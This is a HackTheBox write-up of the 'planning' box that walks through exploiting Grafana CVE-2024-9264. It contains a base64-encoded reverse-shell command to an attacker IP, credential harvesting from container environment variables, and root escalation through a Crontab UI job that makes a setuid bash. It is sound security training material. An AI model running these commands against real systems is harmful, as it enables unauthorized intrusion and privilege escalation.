---
title: HackTheBox - planning writeup (Linux/Easy)
categories: [HackTheBox]
tags: [HackTheBox, ffuf, grafana, crontabUI, setuid, CVE-2024-9264]
render_with_liquid: false
---

`planning` is an assume-breach box where you're given the credentials of `admin`, which at first is not apparent where to use them. The box had a Grafana instance running that was vulnerable to CVE-2024-9264 (RCE) that dropped me to a Docker container. I found SSH credentials in the environment variables. Once I was logged in via SSH I found credentials to an internal website running Crontab UI, that I used to create a crontab job as root to escalate my privileges.

## Recon

I run nmap on the host which found port 80 and 22 open

```bash
$ nmap -sSVC -A -vv -oA planning 10.10.11.68
Scanning 10.10.11.68 [1000 ports]
Discovered open port 22/tcp on 10.10.11.68
Discovered open port 80/tcp on 10.10.11.68
Completed SYN Stealth Scan at 19:11, 2.15s elapsed (1000 total ports)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

the webserver redirected to `http://planning.htb/` so I went ahead of added that to my `/etc/hosts` file and gave it a vist

![edukate.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/edukate.png)

## Foothold

the website didn't really have any interesting functionalities, or any at all, it had 2 forms, a contract form, which after examining with burpsuite revealed that it didn't actually submit any data 

![contact_us.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/contact_us.png)

there was also another form to enroll in courses which did submit some data

![enroll_form.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/enroll_form.png)

but the website always return the same response after playing with the request

![successful_registration.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/successful_registration.png)


I was stuck here for a while, because while I had user credentials it wasn't apparent there I would use them, so I took a step back and started enumerating vhosts with different wordlist other than the good'ol `raft-medium-files-lowercase.txt` to eventually find a `grafana.planning.htb` with `namelist.txt` wordlist form Seclist repo

```bash
$ ffuf -u http://planning.htb -w namelist.txt -H 'Host: FUZZ.planning.htb' -ac

        /''___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 172ms]
:: Progress: [151265/151265] :: Job [1/1] :: 209 req/sec :: Duration: [0:12:31] :: Errors: 0 ::
```

![grafana.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/grafana.png)

we find a grafana instance version 11.0.0, where the `admin` user creds worked

after looking around I found that grafana v11.0.0 is vulnerable to `CVE-2024-9264` leading to file inclusion and RCE

I used [this exploit](https://github.com/nollium/CVE-2024-9264) to confirm and exploit the CVE, I started with reading `/etc/passwd` which only no users with shells except for `root` which was the first sign that it's likely a docker container

```bash
$ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

from there I got reverse shell using the same exploit

```bash
$ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjQvMTAwMDAgMD4mMQo=|base64 -d|bash' http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjQvMTAwMDAgMD4mMQo=|base64 -d|bash
```

meanwhile in my other terminal

```bash
$ nc -lnvp 10000
Connection from 10.10.11.68:52500
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~#
```

the hostname `7ce659d667d7` confirmed that I'm inside a docker container

## enzo

usually containers environment has some secrets for init scripts to work, so I checked the env and found some credentials I used to login as enzo via ssh and grabbed the user flag 

```bash
root@7ce659d667d7:~# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```

## root

once I logged in as enzo, I looked around in the file system and found an unusual crontab file under `/opt` which had a password inside of it

```bash
enzo@planning:~$ cat user.txt
b8****************************6a
enzo@planning:/opt/crontabs$
enzo@planning:/opt/crontabs$ ls /opt/
containerd  crontabs
enzo@planning:/opt/crontabs$ ls /opt/crontabs/
crontab.db
enzo@planning:/opt/crontabs$ cat crontab.db | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```

this looks exactly like crontab configuration, just in the wrong format and the wrong place, with the first task mentioning the password `P4ssw0rdS0pRi0T3c`

after more digging I found a few ports running internally in the box

```bash
enzo@planning:/opt/crontabs$ ss -lntp
State        Recv-Q       Send-Q               Local Address:Port                Peer Address:Port       Process
LISTEN       0            4096                 127.0.0.53%lo:53                       0.0.0.0:*
LISTEN       0            4096                     127.0.0.1:3000                     0.0.0.0:*
LISTEN       0            511                      127.0.0.1:8000                     0.0.0.0:*
LISTEN       0            4096                    127.0.0.54:53                       0.0.0.0:*
LISTEN       0            4096                     127.0.0.1:33003                    0.0.0.0:*
LISTEN       0            151                      127.0.0.1:3306                     0.0.0.0:*
LISTEN       0            511                        0.0.0.0:80                       0.0.0.0:*
LISTEN       0            70                       127.0.0.1:33060                    0.0.0.0:*
LISTEN       0            4096                             *:22                             *:*
```

trying to connect to 8000 yields a `HTTP/1.1 401 Unauthorized` hinting that it's running an http server

```bash
enzo@planning:~$ curl 127.0.0.1:8000 -v
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
> GET / HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 401 Unauthorized
< X-Powered-By: Express
< WWW-Authenticate: Basic realm="Restricted Area"
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< ETag: W/"0-2jmj7l5rSw0yVb/vlWAYkK/YBwk"
< Date: Sun, 21 Sep 2025 19:16:00 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
<
* Connection #0 to host 127.0.0.1 left intact
enzo@planning:~$
```

so I used ssh local port forward to expose the website and interact with it from my machine

```bash
$ ssh -L 8000:localhost:8000 enzo@planning.htb
```

![port_8080_auth.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/port_8080_auth.png)

since I had a password but not a username, I tried a few usernames such as grafana, enzo, root, and root worked, and I was dropped into an instance of crontabUI

![crontabUI.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/crontabUI.png)

where I could find the 2 services I saw in `/opt/crontabs/crontab.db`

I registered a new job to copy `/bin/bash` to `/tmp` and give it `setuid` bit

![priv_esc_job.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/priv_esc_job.png)

then executed the job using the `Run now` button instead of waiting

![run_now.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/planning/run_now.png)

and got my root shell

```bash
enzo@planning:~$ ls -lh /tmp/jeffy
-rwsr-sr-x 1 root root 1.4M Sep 21 19:28 /tmp/jeffy
enzo@planning:~$ /tmp/jeffy -p
jeffy-5.2# whoami
root
jeffy-5.2# ls /root/
root.txt  scripts
jeffy-5.2#
```
